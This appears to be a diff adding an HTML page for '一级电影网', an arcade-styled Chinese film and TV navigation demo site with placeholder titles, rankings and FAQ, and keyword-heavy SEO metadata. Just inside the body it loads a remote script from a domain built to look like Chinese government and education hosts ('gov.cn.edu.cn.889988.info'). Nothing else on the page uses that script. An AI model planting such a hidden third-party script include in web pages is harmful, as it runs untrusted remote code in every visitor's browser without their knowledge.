@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>一级电影网 - S级影视导航站 | 一级电影网</title>
+<meta name="description" content="一级电影网（https://yijidianyingwang-top.github.io）以街机游戏厅风格呈现电影、电视剧、动漫、综艺推荐，S级内容精选，移动端自适应单页站点。" />
+<meta name="keywords" content="一级电影网, S级电影, 高清电影推荐, 电视剧推荐, 动漫推荐, 综艺推荐, yijidianyingwang-top.github.io" />
+<meta name="robots" content="index,follow" />
+<link rel="canonical" href="https://yijidianyingwang-top.github.io" />
+<meta property="og:title" content="一级电影网 - S级影视导航站" />
+<meta property="og:description" content="动作 / RPG剧集 / 像素动漫 / 竞速综艺，一级内容精选。" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://yijidianyingwang-top.github.io" />
+<style>
+  :root{
+    --bg:#04060a;
+    --panel:#0a0e1a;
+    --ink:#e0f0e0;
+    --muted:#5a8a5a;
+    --green:#00ff41;
+    --pink:#ff0080;
+    --yellow:#ffd700;
+    --line:rgba(0,255,65,.25);
+    --mono:"Courier New",ui-monospace,Menlo,monospace;
+    --sans:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{
+    margin:0;background:
+      repeating-linear-gradient(0deg,rgba(0,255,65,.03) 0 2px,transparent 2px 4px),
+      radial-gradient(600px 400px at 50% 0%,rgba(0,255,65,.08),transparent 70%),
+      var(--bg);
+    color:var(--ink);font-family:var(--mono);line-height:1.7;
+  }
+  a{color:inherit;text-decoration:none}
+  .wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+
+  /* insert coin bar */
+  .coinbar{border-bottom:2px solid var(--green);background:#000;padding:8px 0}
+  .coinbar .wrap{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
+  .coin{color:var(--yellow);font-size:13px;letter-spacing:2px;animation:flash 1.2s infinite}
+  @keyframes flash{50%{opacity:.4}}
+  .player{color:var(--pink);font-size:13px}
+  .score{color:var(--green);font-size:13px}
+
+  header{padding:30px 0 16px}
+  .brand{text-align:center;margin-bottom:20px}
+  .brand h1{margin:0;font-size:clamp(36px,7vw,80px);letter-spacing:4px;text-shadow:3px 0 var(--pink),-3px 0 var(--green)}
+  .brand h1 em{color:var(--yellow);font-style:normal}
+  .brand .sub{color:var(--muted);font-size:14px;margin-top:8px;letter-spacing:3px}
+
+  .menu{display:flex;gap:0;justify-content:center;flex-wrap:wrap;border:2px solid var(--green);border-radius:0;max-width:900px;margin:0 auto}
+  .menu a{padding:12px 18px;font-size:14px;border-right:1px solid var(--line);color:var(--ink)}
+  .menu a:last-child{border-right:none}
+  .menu a:hover{background:var(--green);color:#000}
+
+  /* hero */
+  .hero{padding:50px 0;text-align:center}
+  .cartridge{
+    max-width:520px;margin:0 auto 30px;border:3px solid var(--green);border-radius:16px;
+    background:linear-gradient(180deg,#0a0e1a,#04060a);
+    padding:30px 24px;position:relative;
+  }
+  .cartridge:before,.cartridge:after{
+    content:"";position:absolute;top:-12px;width:40px;height:14px;background:var(--green);border-radius:4px 4px 0 0;
+  }
+  .cartridge:before{left:20%}.cartridge:after{right:20%}
+  .cartridge .label{font-size:12px;color:var(--yellow);letter-spacing:3px;margin-bottom:12px}
+  .cartridge h2{font-size:clamp(22px,4vw,40px);margin:0 0 10px;color:#fff}
+  .cartridge p{color:var(--muted);font-size:14px;margin:0}
+  .cartridge .url{margin-top:16px;padding:10px;border:1px dashed var(--green);color:var(--green);font-size:13px}
+  .start-btn{
+    display:inline-block;margin-top:24px;padding:16px 36px;font-size:18px;font-weight:700;
+    background:var(--pink);color:#fff;border:3px solid var(--pink);border-radius:8px;
+    box-shadow:0 0 20px rgba(255,0,128,.5);letter-spacing:2px;
+  }
+
+  section{padding:50px 0;border-top:2px dashed var(--line)}
+  .sec-head{display:flex;align-items:center;gap:14px;margin-bottom:28px;justify-content:center}
+  .sec-head h3{margin:0;font-size:clamp(22px,3.4vw,36px);color:#fff}
+  .sec-head .lvl{background:var(--yellow);color:#000;font-size:12px;padding:4px 10px;border-radius:4px;letter-spacing:1px}
+
+  .grid{display:grid;gap:20px;grid-template-columns:repeat(4,1fr)}
+  .cart{
+    background:var(--panel);border:2px solid var(--line);border-radius:10px;overflow:hidden;transition:.2s;
+    position:relative;
+  }
+  .cart:hover{transform:translateY(-6px);border-color:var(--pink);box-shadow:0 0 18px rgba(255,0,128,.35)}
+  .cart .slot{
+    height:120px;display:flex;align-items:center;justify-content:center;
+    font-size:42px;background:linear-gradient(135deg,rgba(0,255,65,.1),rgba(255,0,128,.1));
+    border-bottom:2px solid var(--line);position:relative;
+  }
+  .cart .slot:before{
+    content:"▼";position:absolute;top:8px;left:50%;transform:translateX(-50%);
+    font-size:10px;color:var(--yellow);
+  }
+  .cart .info{padding:14px}
+  .cart .type{font-size:11px;color:var(--green);letter-spacing:2px}
+  .cart h4{margin:6px 0 4px;font-size:16px;color:#fff}
+  .cart p{margin:0;color:var(--muted);font-size:12px}
+  .cart .btn{
+    display:block;margin-top:10px;text-align:center;padding:8px;
+    border:1px solid var(--green);color:var(--green);font-size:12px;border-radius:4px;
+  }
+  .cart .btn:hover{background:var(--green);color:#000}
+
+  .top6{display:grid;gap:12px;max-width:800px;margin:0 auto}
+  .rankrow{
+    display:grid;grid-template-columns:50px 1fr auto;align-items:center;gap:16px;
+    background:var(--panel);border:1px solid var(--line);padding:14px 18px;border-radius:6px;
+  }
+  .rankrow .rn{font-size:24px;color:var(--yellow);font-weight:700}
+  .rankrow h4{margin:0;color:#fff;font-size:16px}
+  .rankrow span{font-size:12px;color:var(--muted)}
+  .rankrow .pts{color:var(--pink);font-size:14px}
+
+  .faq{display:grid;gap:10px;max-width:800px;margin:0 auto}
+  .faq details{border:1px solid var(--line);padding:14px 18px;background:var(--panel)}
+  summary{cursor:pointer;color:#fff;font-weight:700}
+  .faq details p{color:var(--muted);margin:10px 0 0}
+
+  footer{border-top:3px solid var(--green);padding:30px 0 100px;text-align:center;font-size:12px;color:var(--muted)}
+  footer b{color:var(--green)}
+
+  /* arcade nav */
+  .arcade{display:none}
+
+  @media(max-width:980px){.grid{grid-template-columns:repeat(2,1fr)}}
+  @media(max-width:620px){
+    .grid{grid-template-columns:1fr}
+    .menu{display:none}
+    .arcade{display:flex;position:fixed;bottom:0;left:0;right:0;z-index:60;background:#000;border-top:2px solid var(--green);padding:8px 4px}
+    .arcade a{color:var(--muted);font-size:11px;text-align:center;flex:1;min-height:48px;display:flex;flex-direction:column;align-items:center;justify-content:center}
+    .arcade a span{font-size:20px;margin-bottom:2px}
+    .arcade a:hover{color:var(--green)}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="coinbar"><div class="wrap">
+  <span class="coin">🪙 INSERT COIN · PLAYER 1</span>
+  <span class="player">STAGE 01 · 一级电影网</span>
+  <span class="score">SCORE: 999999</span>
+</div></div>
+
+<header>
+  <div class="wrap">
+    <div class="brand">
+      <h1>一级<em>电影网</em></h1>
+      <div class="sub">▶ S-RANK MOVIE ARCADE ◀</div>
+    </div>
+    <nav class="menu">
+      <a href="#action">动作频道</a>
+      <a href="#rpg">RPG剧集</a>
+      <a href="#pixel">像素动漫</a>
+      <a href="#race">竞速综艺</a>
+      <a href="#top">高分榜</a>
+      <a href="#about">关于</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- HERO -->
+  <section class="hero wrap" id="home">
+    <div class="cartridge">
+      <div class="label">▼ CARTRIDGE LABEL ▼</div>
+      <h2>一级内容 · 一键开玩</h2>
+      <p>一级电影网精选 S 级电影、剧集、动漫与综艺，单页加载、移动端自适应、点开就看。</p>
+      <div class="url">https://yijidianyingwang-top.github.io</div>
+    </div>
+    <a class="start-btn" href="#action">▶ PRESS START</a>
+  </section>
+
+  <!-- 动作频道 -->
+  <section class="wrap" id="action">
+    <div class="sec-head"><span class="lvl">CH 01</span><h3>动作频道</h3></div>
+    <div class="grid">
+      <article class="cart"><div class="slot">🥊</div><div class="info"><div class="type">ACTION · 格斗</div><h4>街头霸王2026</h4><p>地下格斗场，一拳定胜负。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+      <article class="cart"><div class="slot">🚗</div><div class="info"><div class="type">CHASE · 追车</div><h4>午夜狂飙</h4><p>洛杉矶街头，没有规则只有速度。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+      <article class="cart"><div class="slot">💥</div><div class="info"><div class="type">EXPLOSION · 爆破</div><h4>拆弹专家3</h4><p>倒计时开始，每一秒都是生死。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+      <article class="cart"><div class="slot">🗡️</div><div class="info"><div class="type">SAMURAI · 剑戟</div><h4>浪人斩</h4><p>幕末时代，一刀流对决新选组。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+    </div>
+  </section>
+
+  <!-- RPG剧集 -->
+  <section class="wrap" id="rpg">
+    <div class="sec-head"><span class="lvl">CH 02</span><h3>RPG剧集</h3></div>
+    <div class="grid">
+      <article class="cart"><div class="slot">🗺️</div><div class="info"><div class="type">QUEST · 24集</div><h4>暗线任务</h4><p>每个案件像支线任务，层层解锁真相。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+      <article class="cart"><div class="slot">🏰</div><div class="info"><div class="type">FANTASY · 36集</div><h4>北境王座</h4><p>冰与火之间，谁主沉浮。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+      <article class="cart"><div class="slot">🔍</div><div class="info"><div class="type">MYSTERY · 12集</div><h4>第七档案</h4><p>解密类剧集，每集一个密室谜题。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+      <article class="cart"><div class="slot">💼</div><div class="info"><div class="type">DRAMA · 20集</div><h4>职场BOSS战</h4><p>办公室政治像打副本，升职就是通关。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+    </div>
+  </section>
+
+  <!-- 像素动漫 -->
+  <section class="wrap" id="pixel">
+    <div class="sec-head"><span class="lvl">CH 03</span><h3>像素动漫</h3></div>
+    <div class="grid">
+      <article class="cart"><div class="slot">⚔️</div><div class="info"><div class="type">SHONEN · 周更</div><h4>像素勇者</h4><p>8-bit 世界里的热血冒险，每集升级。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+      <article class="cart"><div class="slot">🧙</div><div class="info"><div class="type">MAGIC · 完结</div><h4>魔法像素师</h4><p>用像素画画就能施法，创意满分。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+      <article class="cart"><div class="slot">🤖</div><div class="info"><div class="type">MECHA · 季番</div><h4>机甲像素战争</h4><p>复古画风+硬核机甲设定，反差萌。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+      <article class="cart"><div class="slot">🌸</div><div class="info"><div class="type">SLICE · 日常</div><h4>像素小食堂</h4><p>治愈系，每集做一道像素料理。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+    </div>
+  </section>
+
+  <!-- 竞速综艺 -->
+  <section class="wrap" id="race">
+    <div class="sec-head"><span class="lvl">CH 04</span><h3>竞速综艺</h3></div>
+    <div class="grid">
+      <article class="cart"><div class="slot">🏁</div><div class="info"><div class="type">RACE · S3</div><h4>极速挑战</h4><p>明星+素人，城市定向越野竞速。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+      <article class="cart"><div class="slot">🍳</div><div class="info"><div class="type">COOK · S2</div><h4>限时料理</h4><p>30分钟做一桌菜，倒计时紧张感拉满。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+      <article class="cart"><div class="slot">🎤</div><div class="info"><div class="type">TALENT · S4</div><h4>全能偶像</h4><p>唱跳演全能比拼，淘汰制刺激。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+      <article class="cart"><div class="slot">🧩</div><div class="info"><div class="type">PUZZLE · S1</div><h4>密室大逃脱</h4><p>实景解谜，NPC 演技在线。</p><a class="btn" href="#">▶ PLAY #</a></div></article>
+    </div>
+  </section>
+
+  <!-- 高分榜 -->
+  <section class="wrap" id="top">
+    <div class="sec-head"><span class="lvl">RANK</span><h3>高分榜 TOP 6</h3></div>
+    <div class="top6">
+      <div class="rankrow"><span class="rn">01</span><div><h4>街头霸王2026</h4><span>动作 · 9.6 分 · S级</span></div><span class="pts">99999</span></div>
+      <div class="rankrow"><span class="rn">02</span><div><h4>暗线任务</h4><span>RPG剧集 · 9.4 分 · S级</span></div><span class="pts">88888</span></div>
+      <div class="rankrow"><span class="rn">03</span><div><h4>像素勇者</h4><span>动漫 · 9.3 分 · A+级</span></div><span class="pts">77777</span></div>
+      <div class="rankrow"><span class="rn">04</span><div><h4>极速挑战</h4><span>综艺 · 9.1 分 · A级</span></div><span class="pts">66666</span></div>
+      <div class="rankrow"><span class="rn">05</span><div><h4>午夜狂飙</h4><span>动作 · 8.9 分 · A级</span></div><span class="pts">55555</span></div>
+      <div class="rankrow"><span class="rn">06</span><div><h4>北境王座</h4><span>剧集 · 8.8 分 · A级</span></div><span class="pts">44444</span></div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section class="wrap" id="about">
+    <div class="sec-head"><span class="lvl">INFO</span><h3>关于本站</h3></div>
+    <div style="max-width:800px;margin:0 auto;text-align:center">
+      <p style="font-size:16px;color:#fff">
+        <b style="color:var(--yellow)">一级电影网</b> 的网址是
+        <a href="https://yijidianyingwang-top.github.io" style="color:var(--green);border-bottom:1px dashed var(--green)">https://yijidianyingwang-top.github.io</a>。
+        它是一个单页式"S级影视导航"演示站，以街机游戏厅为视觉主题，包含动作频道、RPG剧集、像素动漫、竞速综艺、高分榜等栏目。
+      </p>
+      <p style="color:var(--muted)">⚠️ 页面中片名、评分、集数均为示例占位；实际运营请确保获得相应版权授权。</p>
+
+      <div class="faq" style="margin-top:28px;text-align:left">
+        <details open><summary>为什么叫"一级电影网"？</summary><p>一级 = S级 = 精选中的精选。我们只推值得看的内容，不堆数量。</p></details>
+        <details><summary>手机上操作方便吗？</summary><p>方便。底部有街机方向键+按钮导航，拇指就能操作。</p></details>
+        <details><summary>链接为什么是 # ？</summary><p>按你的要求，内页链接统一用 # 占位，方便后续替换为真实页面。</p></details>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>© 2026 <b>一级电影网</b> · S-RANK MOVIE ARCADE · 演示站点</p>
+    <p>https://yijidianyingwang-top.github.io</p>
+  </div>
+</footer>
+
+<nav class="arcade">
+  <a href="#action"><span>🥊</span>动作</a>
+  <a href="#rpg"><span>🗺️</span>剧集</a>
+  <a href="#pixel"><span>⚔️</span>动漫</a>
+  <a href="#race"><span>🏁</span>综艺</a>
+  <a href="#top"><span>🏆</span>排行</a>
+</nav>
+
+<script>
+  document.querySelectorAll('.arcade a').forEach(function(a){
+    a.addEventListener('click', function(e){
+      var id=this.getAttribute('href');
+      if(id&&id.startsWith('#')){var el=document.querySelector(id);if(el){e.preventDefault();el.scrollIntoView({behavior:'smooth'});}}
+    });
+  });
+</script>
+</body>
+</html>
